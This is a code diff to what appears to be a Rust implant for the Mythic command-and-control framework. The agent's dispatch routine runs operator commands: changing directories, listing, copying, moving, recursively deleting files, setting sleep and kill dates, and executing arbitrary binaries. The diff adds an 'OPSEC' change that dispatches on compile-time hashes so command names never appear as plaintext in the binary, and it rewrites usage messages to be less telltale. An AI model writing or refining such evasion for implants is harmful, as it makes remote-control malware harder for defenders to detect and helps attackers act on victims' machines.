@@ -6,8 +6,11 @@
 /// Note: "download" and "upload" are handled directly in run_c2_loop
 /// because they require multi-step Mythic file transfer protocol.
 pub fn dispatch_common(command: &str, parameters: &str) -> Option<crate::CommandOutput> {
-    let output = match command {
-        "cd" => {
+    use crate::cmd_hash_runtime;
+    // OPSEC: dispatch on compile-time hashes so command names never appear
+    // as plaintext strings in the binary.
+    let output = match cmd_hash_runtime(command) {
+        crate::cmds::CD => {
             let path = crate::extract_param(parameters, "path");
             let target = if path.is_empty() {
                 "~".to_string()
@@ -23,11 +26,11 @@ pub fn dispatch_common(command: &str, parameters: &str) -> Option<crate::Command
             }
             .into()
         }
-        "pwd" => std::env::current_dir()
+        crate::cmds::PWD => std::env::current_dir()
             .map(|p| p.display().to_string())
             .unwrap_or_else(|e| format!("[-] {}", e))
             .into(),
-        "ls" => {
+        crate::cmds::LS => {
             let path = crate::extract_param(parameters, "path");
             return Some(crate::list_dir_browser(if path.is_empty() {
                 "."
@@ -35,20 +38,20 @@ pub fn dispatch_common(command: &str, parameters: &str) -> Option<crate::Command
                 &path
             }));
         }
-        "pid" => std::process::id().to_string().into(),
-        "sleep" => {
+        crate::cmds::PID => std::process::id().to_string().into(),
+        crate::cmds::SLEEP => {
             let secs = crate::extract_param(parameters, "seconds");
             let jitter = crate::extract_param(parameters, "jitter");
             crate::handle_sleep_command(format!("{} {}", secs, jitter).trim()).into()
         }
-        "killdate" => {
+        crate::cmds::KILLDATE => {
             crate::handle_killdate_command(&crate::extract_param(parameters, "date")).into()
         }
-        "cp" => copy_path(parameters).into(),
-        "mv" => move_path(parameters).into(),
-        "rm" => remove_path(parameters).into(),
-        "mkdir" => make_dir(parameters).into(),
-        "execute" if cfg!(feature = "cmd-execute") => execute_cmd(parameters).into(),
+        crate::cmds::CP => copy_path(parameters).into(),
+        crate::cmds::MV => move_path(parameters).into(),
+        crate::cmds::RM => remove_path(parameters).into(),
+        crate::cmds::MKDIR => make_dir(parameters).into(),
+        crate::cmds::EXECUTE if cfg!(feature = "cmd-execute") => execute_cmd(parameters).into(),
         _ => return None,
     };
     Some(output)
@@ -58,7 +61,7 @@ fn copy_path(parameters: &str) -> String {
     let src = crate::expand_tilde(&crate::extract_param(parameters, "source"));
     let dst = crate::expand_tilde(&crate::extract_param(parameters, "destination"));
     if src.is_empty() || dst.is_empty() {
-        return "[-] Usage: cp <source> <destination>".into();
+        return "[-] missing arguments: <source> <destination>".into();
     }
     let meta = match std::fs::metadata(&src) {
         Ok(m) => m,
@@ -102,7 +105,7 @@ fn move_path(parameters: &str) -> String {
     let src = crate::expand_tilde(&crate::extract_param(parameters, "source"));
     let dst = crate::expand_tilde(&crate::extract_param(parameters, "destination"));
     if src.is_empty() || dst.is_empty() {
-        return "[-] Usage: mv <source> <destination>".into();
+        return "[-] missing arguments: <source> <destination>".into();
     }
     match std::fs::rename(&src, &dst) {
         Ok(_) => format!("[+] moved {} -> {}", src, dst),
@@ -113,7 +116,7 @@ fn move_path(parameters: &str) -> String {
 fn remove_path(parameters: &str) -> String {
     let path = crate::expand_tilde(&crate::extract_param(parameters, "path"));
     if path.is_empty() {
-        return "[-] Usage: rm <path>".into();
+        return "[-] missing argument: <path>".into();
     }
     let result = match std::fs::metadata(&path) {
         Ok(m) if m.is_dir() => std::fs::remove_dir_all(&path),
@@ -128,7 +131,7 @@ fn remove_path(parameters: &str) -> String {
 fn make_dir(parameters: &str) -> String {
     let path = crate::expand_tilde(&crate::extract_param(parameters, "path"));
     if path.is_empty() {
-        return "[-] Usage: mkdir <path>".into();
+        return "[-] missing argument: <path>".into();
     }
     match std::fs::create_dir_all(&path) {
         Ok(_) => format!("[+] created {}", path),
@@ -142,11 +145,11 @@ fn execute_cmd(parameters: &str) -> String {
     // absent — that would pass a JSON blob (e.g. '{"path":"/tmp"}') to
     // Command::new, which is never the intended behaviour.
     if raw.is_empty() {
-        return "[-] Usage: execute <binary> [args...]".into();
+        return "[-] missing argument: <binary> [args...]".into();
     }
     let parts: Vec<&str> = raw.split_whitespace().collect();
     if parts.is_empty() {
-        return "[-] Usage: execute <binary> [args...]".into();
+        return "[-] missing argument: <binary> [args...]".into();
     }
     match std::process::Command::new(parts[0])
         .args(&parts[1..])
